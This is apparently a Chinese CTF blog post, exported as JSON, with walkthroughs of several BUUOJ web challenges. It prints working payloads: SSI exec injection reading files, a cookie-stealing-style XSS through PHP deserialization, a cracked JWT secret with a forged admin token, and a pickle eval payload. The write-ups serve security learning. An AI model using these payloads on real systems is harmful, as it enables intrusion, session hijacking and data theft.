{"title":"BUUOJ刷题二月第一周","uid":"5b5f4ff7be54bdec87cb56e0a7ffce00","slug":"BUUOJ刷题二月第一周","date":"2021-02-01T12:31:38.000Z","updated":"2021-02-06T14:28:59.230Z","comments":true,"path":"api/articles/BUUOJ刷题二月第一周.json","keywords":"A1andNS","cover":[],"content":"<h2 id=\"BJDCTF2020-EasySearch\"><a href=\"#BJDCTF2020-EasySearch\" class=\"headerlink\" title=\"[BJDCTF2020]EasySearch\"></a>[BJDCTF2020]EasySearch</h2><p>考点：SSI注入</p>\n<p>直接简单试一试，都是failed，所以使用dirsearch去进行目录扫描，得到一个index.php.swp获取源码。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">//加密hash，原文位唯一ID+随机字符(xxxxx)</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">get_hash</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$chars</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$random</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$chars</span><span class=\"token punctuation\">[</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">73</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$chars</span><span class=\"token punctuation\">[</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">73</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$chars</span><span class=\"token punctuation\">[</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">73</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$chars</span><span class=\"token punctuation\">[</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">73</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$chars</span><span class=\"token punctuation\">[</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">73</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Random 5 times</span>\n\t\t<span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">uniqid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$random</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\t<span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-Type: text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token operator\">**</span><span class=\"token operator\">*</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">''</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$admin</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'6d0bc1'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$admin</span> <span class=\"token operator\">==</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('[+] Welcome to manage system')&lt;/script>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$file_shtml</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"public/\"</span><span class=\"token operator\">.</span><span class=\"token function\">get_hash</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".shtml\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$shtml</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_shtml</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Unable to open file!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$text</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'\n            ***\n            ***\n            &lt;h1>Hello,'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/h1>\n            ***\n\t\t\t***'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$shtml</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$shtml</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token operator\">**</span><span class=\"token operator\">*</span>\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"[!] Header  error ...\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('[!] Failed')&lt;/script>\"</span><span class=\"token punctuation\">;</span>\n            \n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token operator\">**</span><span class=\"token operator\">*</span>\n    <span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token operator\">**</span><span class=\"token operator\">*</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>password的md5值的前6位是6d0bc1,写个脚本爆破一下密码。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">99999999</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"6d0bc1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$code</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>爆破出密码为2020666，登陆后会生成一个shtml文件，什么是shtml文件呢。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>shtml是标准通用标记语言下的一个应用，包含有嵌入式服务器方包含命令的文本，在被传送给浏览器之前，服务器会对SHTML文档进行完全地读取、分析以及修改。</p>\n<p>有叫做服务器端包含，Server side include。</p>\n<p>1．显示服务器端环境变量&lt;#echo&gt;</p>\n<p>2．将文本内容直接插入到文档中&lt;#include&gt;</p>\n<p>3．显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等)</p>\n<p>4．直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p>\n<p>5．设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式) 高级SSI<XSSI>可设置变量使用if条件语句。</p></blockquote>\n<p>所以我们可以利用username处来传入代码，进行代码注入，从而执行命令或读取文件。</p>\n<pre class=\"line-numbers language-shtml\" data-language=\"shtml\"><code class=\"language-shtml\">&lt;! #include virtual&#x3D;&quot;&#x2F;etc&#x2F;passwd&quot;–&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>发现被过滤了，换一个命令执行看看。</p>\n<pre class=\"line-numbers language-shtml\" data-language=\"shtml\"><code class=\"language-shtml\">&lt;! #exec cmd&#x3D;&quot;ls&quot;--&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>执行成功，得到当前目录下的文件</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210201213857356.png\" alt=\"image-20210201213857356\"></p>\n<p>修改命令问<code>ls /</code>，发现根目录下没有flag，那就看看webroot吧</p>\n<p>发现了flag相关信息。</p>\n<pre class=\"line-numbers language-shtml\" data-language=\"shtml\"><code class=\"language-shtml\">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password&#x3D;2020666<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210201214351234.png\" alt=\"image-20210201214351234\"></p>\n<p>得到flag。</p>\n<p>相关知识：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。\n\nSSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。\n\n从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"BJDCTF-2nd-xss之光\"><a href=\"#BJDCTF-2nd-xss之光\" class=\"headerlink\" title=\"[BJDCTF 2nd]xss之光\"></a>[BJDCTF 2nd]xss之光</h2><p>考点：git泄露</p>\n<p>进去什么都没有，只能使用dirsearch目录扫描，从而发现存在git泄露，使用githack抓取git目录。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210202141800106.png\" alt=\"image-20210202141800106\"></p>\n<p>index.php:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'yds_is_so_beautiful'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>反序列化问题，但是没有类信息啊。后来看了WP，提供了一中思路，再这种情况下可以考虑使用内置类。随便试试看吧，经过测试我们序列化的字符串会被反序列化然后嵌入网页。从常规的反序列化角度来看，echo一个对象，这是会触发<code>_toString</code>方法的。所以最好是找个有<code>_toString</code>的类，一般常用的内置类是Error类和Exception类。Error类是只适用与php7，而Exception类适用与php5和php7。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;script>alert(document.cookie)&lt;/script>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># $a = '&lt;script>alert(document.cookie)&lt;/script>';</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210202152427719.png\" alt=\"image-20210202152427719\"></p>\n<p>没有发现flag。换一个window.location.href=’<a href=\"http://www.baidu.com&/#39;\">http://www.baidu.com&#39;</a></p>\n<p>使用网页跳转的script脚本，就成功获得了flag。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210202154503089.png\" alt=\"image-20210202154503089\"></p>\n<h2 id=\"CISCN2019-华北赛区-Day1-Web2-ikun\"><a href=\"#CISCN2019-华北赛区-Day1-Web2-ikun\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day1 Web2]ikun\"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>考点：pickle反序列化、jwt伪造cookie</p>\n<p>先看看首页源码，看看都有哪些路由，<code>/,/login,/register</code>等</p>\n<p>并且题目说脑洞大，给了一些hint，ikun们冲鸭,一定要买到lv6!!!</p>\n<p>点击下一页就会传入page不断++，而且page很大到了100都还存在，lv主要是体现在商品图片的名称，图片是什么对应的名称也是什么。那么写个脚本遍历一个page看看，lv6在哪里。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">find_lv6</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://ca08947c-1d43-4954-9ea1-32d3f5b99dea.node3.buuoj.cn/shop?page=\"</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        r<span class=\"token punctuation\">.</span>encoding <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>apparent_encoding\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"lv6.png\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    find_lv6<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>爆破出page=181时出现lv6，可惜我们只有10快钱，买不起啊。抓包看看，修改price没有成功，发现一个有趣的参数discount也就是折扣，默认是8折，修改它试试。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203210100437.png\" alt=\"image-20210203210100437\"></p>\n<p>成功购买到了lv6，是一个重定向到路由/b1g_m4mber</p>\n<p>访问一下，发现页面子允许admin访问。可以发现cookie里面又jwt，去jwt.io网站看看能不能伪造cookie，绕过身份认证。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203210154447.png\" alt=\"image-20210203210154447\"></p>\n<p>首先使用jwtcrack去进行爆破密钥，得到密码是1Kun</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203212349190.png\" alt=\"image-20210203212349190\"></p>\n<p>然后jwt.io网站伪造cookie。</p>\n<pre class=\"line-numbers language-jwt\" data-language=\"jwt\"><code class=\"language-jwt\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>访问成功。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203221553232.png\" alt=\"image-20210203221553232\"></p>\n<p>查看前端源码</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203221702676.png\" alt=\"image-20210203221702676\"></p>\n<p>发现了源码文件，全局搜索pickle，在admin.py文件中看到了一个pickle.loads()的反序列化</p>\n<p><img src=\"C:\\Users\\lilon\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210203230153961.png\" alt=\"image-20210203230153961\"></p>\n<p>在刚才的一键成为大会员处，就存在一个Post传入become参数的点，应该就是存在反序列化的点：</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210203230424033.png\" alt=\"image-20210203230424033\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> urllib\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Payload</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"open('/flag.txt', 'r').read()\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\na <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>Payload<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\na <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注意一点，我们通过查看源码，可以判断出程序是基于python2的，由于python3和python2的不兼容，序列化后的结果也是不同的，所以应该使用python2来执行脚本生成payload。</p>\n<pre class=\"line-numbers language-payload\" data-language=\"payload\"><code class=\"language-payload\">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%20%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改become为我们的payload：</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210204000829671.png\" alt=\"image-20210204000829671\"></p>\n<h2 id=\"GYCTF2020-FlaskApp\"><a href=\"#GYCTF2020-FlaskApp\" class=\"headerlink\" title=\"[GYCTF2020]FlaskApp\"></a>[GYCTF2020]FlaskApp</h2><p>考点：</p>\n<p>通过报错信息，我们可以看到部分程序源码，源码路径是/app/app.py：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/decode'</span><span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'text'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span>\n        text <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"text\"</span><span class=\"token punctuation\">)</span>\n        text_decode <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        tmp <span class=\"token operator\">=</span> <span class=\"token string\">\"结果 ： &#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>text_decode<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> waf<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">\"no no no !!\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'decode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        res <span class=\"token operator\">=</span>  render_template_string<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span>\n        flash<span class=\"token punctuation\">(</span> res <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'decode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n \n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n        text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","text":"[BJDCTF2020]EasySearch考点：SSI注入 直接简单试一试，都是failed，所以使用dirsearch去进行目录扫描，得到一个index.php.swp获取源码。 &lt;?php ob_start(); //加密hash，原文位唯一ID+随机字符(xxxxx...","link":"","photos":[],"count_time":{"symbolsCount":"5.3k","symbolsTime":"5 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 